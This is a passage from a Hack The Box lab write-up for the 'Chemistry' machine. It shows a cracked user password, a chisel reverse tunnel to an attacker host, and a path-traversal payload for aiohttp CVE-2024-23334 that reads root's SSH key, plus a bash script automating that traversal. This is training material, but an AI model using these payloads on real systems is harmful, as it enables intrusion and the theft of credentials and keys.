</span></span></code></pre></div><p>After uploading the file, use the <code>View</code> button to execute it.</p><p><img src=/images/HTB-Chemistry/bad_CIF.png alt="malicious CIF file"></p><p>We get a connection on our listener as <code>app</code>.</p><p><img src=/images/HTB-Chemistry/foothold.png alt="foothold on Chemistry"></p><h3 id=shell-as-rosa>Shell as rosa</h3><p>There is another user called <code>rosa</code>.</p><p><img src=/images/HTB-Chemistry/user_list.png alt="users list"></p><p>Inside <code>/home/app/instance</code> we find <code>database.db</code> which contains the hashes of users. The admin hash is not crackable but we successfully recover <code>rosa</code> password, <code>unicorniosrosados</code>.</p><p><img src=/images/HTB-Chemistry/creds_in_db.png alt="database credentials"></p><p><img src=/images/HTB-Chemistry/rosa_pwd.png alt="rosa password found"></p><p>With this password we login as <code>rosa</code> via SSH and recover the user flag.</p><p><img src=/images/HTB-Chemistry/rosa_SSH.png alt="rosa SSH"></p><p><img src=/images/HTB-Chemistry/user_flag.png alt="Chemistry user flag"></p><p>Using linpeas we find an internal port, we will use chisel for the tunneling.</p><p><img src=/images/HTB-Chemistry/active_ports.png alt="Chemistry internal ports"></p><p>On our local machine</p><pre tabindex=0><code>chisel server -p 9999 --reverse
</code></pre><p>On the target</p><pre tabindex=0><code>./chisel client {KALI_IP}:9999 R:8080:127.0.0.1:8080
</code></pre><p>We go to <code>http://127.0.0.1:8080/</code> and discover a website.</p><p><img src=/images/HTB-Chemistry/internal_website.png alt="internal website"></p><h2 id=privilege-escalation-shell-as-root>Privilege Escalation (shell as root)</h2><p>This website is static and does not offer any exploitable functionalities. Let&rsquo;s use <code>curl</code> to check the headers.</p><pre tabindex=0><code>curl 127.0.0.1:8080 --head
</code></pre><p><img src=/images/HTB-Chemistry/aiohttp.png alt="internal website header"></p><p>We notice <a href=https://docs.aiohttp.org/en/stable/>aiohttp</a> mentioned, this is a <code>Async HTTP client/server for asyncio and Python</code>. Searching <code>aiohttp cve</code> leads to <a href=https://nvd.nist.gov/vuln/detail/cve-2024-23334>CVE-2024-23334</a> with a PoC <a href=https://github.com/z3rObyte/CVE-2024-23334-PoC>here</a>.</p><p>The <code>static</code> directory is not present on our target.</p><p><img src=/images/HTB-Chemistry/no_static_dir.png alt="no static directory"></p><p>So we proceed with some directory brute forcing on the internal website and find <code>/assets</code>.</p><p><img src=/images/HTB-Chemistry/gobuster_internal_website.png alt="directory brute forcing on internal website"></p><p>The vulnerabity is exploited through LFI and we can test that ourselves. After capturing a request, we successfully exploit the LFI vulnerability to read the <code>/etc/passwd</code> file.</p><p><img src=/images/HTB-Chemistry/LFI_vuln.png alt="LFI vulnerability"></p><p>By adjusting the payload to <code>/assets/../../../../root/.ssh/id_rsa</code> we obtain the root SSH key.</p><p><img src=/images/HTB-Chemistry/root_ssh_key.png alt="root SSH key leaked"></p><p>Using the key we can now login as root.</p><pre tabindex=0><code>ssh -i id_rsa root@chemistry.htb
</code></pre><p><img src=/images/HTB-Chemistry/root_flag.png alt="root flag"></p><h3 id=automated-lfi>Automated LFI</h3><p>We can modify the exploit script accordingly to make it work.</p><blockquote><p>We change the port number in <code>url</code>, the <code>payload</code> and <code>file</code> values.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e06c75>url</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;http://localhost:8080&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>string</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;../&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/assets/&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>file</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;root/.ssh/id_rsa&#34;</span> <span style=color:#7f848e># without the first /</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> <span style=color:#56b6c2>((</span><span style=color:#e06c75>i</span><span style=color:#56b6c2>=</span>0; i&lt;15; i++<span style=color:#56b6c2>))</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>payload</span><span style=color:#56b6c2>+=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$string</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;[+] Testing with </span><span style=color:#e06c75>$payload$file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>status_code</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>curl --path-as-is -s -o /dev/null -w <span style=color:#98c379>&#34;%{http_code}&#34;</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$url$payload$file</span><span style=color:#98c379>&#34;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> -e <span style=color:#98c379>&#34;\tStatus code --&gt; </span><span style=color:#e06c75>$status_code</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#56b6c2>[[</span> <span style=color:#e06c75>$status_code</span> -eq <span style=color:#d19a66>200</span> <span style=color:#56b6c2>]]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>        curl -s --path-as-is <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$url$payload$file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>break</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span></code></pre></div><p><img src=/images/HTB-Chemistry/auto_LFI.png alt="automated LFI in AioHTTP"></p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-apaxheblaze/>&#8592;
Previous:
HTB Challenge: ApacheBlaze</a></p><p class=prev-post-date>March 1, 2025</p></div><div class=next-post><p><a href=/posts/htb-alert/>Next:
HTB: Alert
&#8594;</a></p><p class=next-post-date>March 21, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold-shell-as-app>Initial Foothold (shell as app)</a><ul><li><a href=#shell-as-rosa>Shell as rosa</a></li></ul></li><li><a href=#privilege-escalation-shell-as-root>Privilege Escalation (shell as root)</a><ul><li><a href=#automated-lfi>Automated LFI</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>